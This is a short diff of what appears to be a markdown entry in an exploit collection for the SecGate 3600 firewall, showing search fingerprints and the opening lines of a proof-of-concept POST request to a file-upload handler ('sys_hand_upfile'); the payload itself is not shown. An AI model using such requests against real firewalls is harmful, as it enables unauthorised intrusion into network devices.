@@ -8,7 +8,7 @@ body="./images/lsec/login/loading.gif"
 title="网神SecGate 3600防火墙"
 ```
 
-## poc
+## POC
 ```
 POST /?g=sys_hand_upfile HTTP/1.1
 Host: 127.0.0.1
